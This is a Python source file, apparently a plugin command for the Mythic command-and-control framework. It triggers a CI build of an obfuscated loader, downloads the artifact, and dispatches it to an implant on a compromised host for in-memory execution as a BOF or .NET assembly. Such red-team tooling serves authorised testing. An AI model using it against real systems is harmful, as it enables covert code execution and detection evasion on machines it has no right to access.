from __future__ import annotations

import json
import logging
import os

from mythic_container.MythicCommandBase import (
    CommandBase,
    CommandAttributes,
    CommandParameter,
    ParameterGroupInfo,
    ParameterType,
    PTTaskMessageAllData,
    PTTaskCreateTaskingMessageResponse,
    TaskArguments,
)
from mythic_container.MythicGoRPC import (
    SendMythicRPCCallbackSearch,
    SendMythicRPCFileCreate,
    SendMythicRPCResponseCreate,
    MythicRPCCallbackSearchMessage,
    MythicRPCFileCreateMessage,
    MythicRPCResponseCreateMessage,
)

from daedalus.providers import get_provider, BuildStatus
from daedalus.eventing import _poll_build
from daedalus_ca.secrets import resolve_provider_kwargs
from daedalus_ca.shared import load_agent_support, select_artifact, provider_credential_parameters

logger = logging.getLogger("daedalus_ca.quick_build")


class QuickBuildArguments(TaskArguments):
    def __init__(self, command_line: str, task_id: int = 0, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="job",
                type=ParameterType.String,
                description="CI job/workflow name to trigger (e.g. loader-c-mingw)",
                parameter_group_info=[
                    ParameterGroupInfo(required=True, ui_position=1),
                ],
            ),
            CommandParameter(
                name="provider",
                type=ParameterType.ChooseOneCustom,
                description="CI/CD provider",
                choices=["jenkins", "github", "gitlab", "forgejo", "gitea"],
                default_value="jenkins",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=2),
                ],
            ),
            CommandParameter(
                name="build_params",
                type=ParameterType.String,
                description="Build parameters as JSON object (e.g. {\"LANGUAGE\":\"c-mingw\",\"OBFUSCATION\":\"full\"})",
                default_value="{}",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=3),
                ],
            ),
            CommandParameter(
                name="tool_type",
                type=ParameterType.ChooseOne,
                description="How to handle the compiled output",
                choices=["register_only", "bof", "assembly"],
                default_value="register_only",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=4),
                ],
            ),
            CommandParameter(
                name="timeout",
                type=ParameterType.Number,
                description="Build timeout in seconds",
                default_value=300,
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=5),
                ],
            ),
            CommandParameter(
                name="bof_args",
                type=ParameterType.String,
                description="Arguments to pass to the BOF (if tool_type is bof)",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=6),
                ],
            ),
            CommandParameter(
                name="assembly_args",
                type=ParameterType.String,
                description="Arguments to pass to the .NET assembly (if tool_type is assembly)",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=7),
                ],
            ),
            *provider_credential_parameters(),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)

    async def parse_dictionary(self, dictionary: dict):
        self.load_args_from_dictionary(dictionary)


class QuickBuild(CommandBase):
    cmd = "daedalus_quick_build"
    description = (
        "Trigger a CI/CD job with arbitrary parameters, wait for completion, "
        "download the artifact, and register or execute it. A generic build "
        "command for any CI job - use daedalus_obfuscate_build for repo-based "
        "obfuscation pipelines instead."
    )
    help_cmd = (
        'daedalus_quick_build -job loader-c-mingw -build_params \'{"OBFUSCATION":"full"}\'\n'
        "daedalus_quick_build -job loader-c-mingw -tool_type bof"
    )
    author = "@Lavender-exe"
    version = 1
    script_only = True
    argument_class = QuickBuildArguments
    attackmapping = ["T1027", "T1105"]
    attributes = CommandAttributes(
        spawn_and_injectable=False,
        builtin=True,
        suggested_command=True,
        load_only=False,
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        try:
            provider_name = (taskData.args.get_arg("provider") or os.getenv("DAEDALUS_PROVIDER", "jenkins")).lower()
            job = taskData.args.get_arg("job")
            raw_params = taskData.args.get_arg("build_params") or "{}"
            tool_type = taskData.args.get_arg("tool_type") or "register_only"
            raw_timeout = taskData.args.get_arg("timeout") or 300
            timeout = int(raw_timeout) if raw_timeout else 300
            bof_args = taskData.args.get_arg("bof_args") or ""
            assembly_args = taskData.args.get_arg("assembly_args") or ""

            if not job:
                raise ValueError("job is required")

            build_params = json.loads(raw_params) if isinstance(raw_params, str) else raw_params

            kwargs = resolve_provider_kwargs(taskData, provider_name)
            provider = get_provider(provider_name, **kwargs)

            param_summary = ", ".join(f"{k}={v}" for k, v in build_params.items()) if build_params else "default"
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=(
                    f"Triggering build:\n"
                    f"  Job:      {provider_name}/{job}\n"
                    f"  Params:   {param_summary}\n"
                    f"  Timeout:  {timeout}s\n"
                ).encode(),
            ))

            build_result = await provider.trigger_build(job, build_params)
            if not build_result.build_id:
                raise RuntimeError(f"Build trigger failed: {build_result.error or 'no build ID returned'}")

            build_id = build_result.build_id
            logger.info("Build triggered: %s/%s #%s", provider_name, job, build_id)

            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=f"Build #{build_id} triggered, polling for completion...\n".encode(),
            ))

            build_result = await _poll_build(provider, job, build_id, timeout)

            if build_result.status == BuildStatus.UNKNOWN:
                raise RuntimeError(f"Build timed out after {timeout}s")
            if build_result.status != BuildStatus.SUCCESS:
                log_tail = await provider.get_build_log(job, build_id, tail=30)
                raise RuntimeError(
                    f"Build failed ({build_result.status.value}):\n{log_tail}"
                )

            artifacts = await provider.list_artifacts(job, build_id)
            selected = select_artifact(artifacts)
            artifact_name = selected["relativePath"] if selected else job

            artifact_bytes = await provider.download_artifact(job, build_id, artifact_name)
            logger.info("Downloaded %s (%d bytes)", artifact_name, len(artifact_bytes))

            delete_after = tool_type != "register_only"
            file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
                TaskID=taskData.Task.ID,
                FileContents=artifact_bytes,
                Filename=os.path.basename(artifact_name),
                DeleteAfterFetch=delete_after,
                Comment=f"Daedalus CA: quick build from {provider_name}/{job} #{build_id}",
            ))
            if not file_resp.Success:
                raise RuntimeError(f"File upload failed: {file_resp.Error}")

            agent_file_id = file_resp.AgentFileId

            if tool_type == "register_only":
                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                    TaskID=taskData.Task.ID,
                    Response=(
                        f"Build #{build_id} complete ({build_result.duration_seconds:.0f}s)\n"
                        f"Registered {artifact_name} ({len(artifact_bytes)} bytes)\n"
                        f"File ID: {agent_file_id}"
                    ).encode(),
                ))
                response.DisplayParams = f"[registered] {artifact_name} from {provider_name}/{job} #{build_id}"
                response.Completed = True
                return response

            support = load_agent_support()
            callback_resp = await SendMythicRPCCallbackSearch(MythicRPCCallbackSearchMessage(
                CallbackID=taskData.Task.CallbackID,
            ))

            target_payload_type = taskData.PayloadType
            if not target_payload_type and callback_resp.Success and callback_resp.Results:
                target_payload_type = getattr(callback_resp.Results[0], "PayloadType", "") or ""

            agent_cfg = support.get(target_payload_type, {})

            if tool_type == "bof":
                native_cmd = agent_cfg.get("bof_command", "execute_coff")
                file_param = agent_cfg.get("bof_file_parameter_name", "bof_file")
                params = {file_param: agent_file_id}
                if bof_args:
                    arg_param = agent_cfg.get("bof_argument_array_parameter_name", "arguments")
                    params[arg_param] = bof_args
            elif tool_type == "assembly":
                default_method = agent_cfg.get("assembly_default_execution_method", "execute_assembly")
                native_cmd = agent_cfg.get(f"{default_method}_command", "execute_assembly")
                file_param = agent_cfg.get(f"{default_method}_file_parameter_name", "assembly_file")
                params = {file_param: agent_file_id}
                if assembly_args:
                    arg_param = agent_cfg.get(f"{default_method}_argument_parameter_name", "assembly_arguments")
                    params[arg_param] = assembly_args
            else:
                raise ValueError(f"Unknown tool_type: {tool_type}")

            response.DisplayParams = f"[{tool_type}] {artifact_name} from {provider_name}/{job} #{build_id}"
            response.CommandName = native_cmd
            response.ReprocessAtNewCommandPayloadType = target_payload_type
            response.Params = json.dumps(params)

            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=(
                    f"Build #{build_id} complete ({build_result.duration_seconds:.0f}s)\n"
                    f"Downloaded {artifact_name} ({len(artifact_bytes)} bytes)\n"
                    f"Delegating to {target_payload_type}/{native_cmd}"
                ).encode(),
            ))

        except Exception as e:
            logger.error("quick_build failed: %s", e, exc_info=True)
            response.Success = False
            response.Error = str(e)
            response.Completed = True

        return response
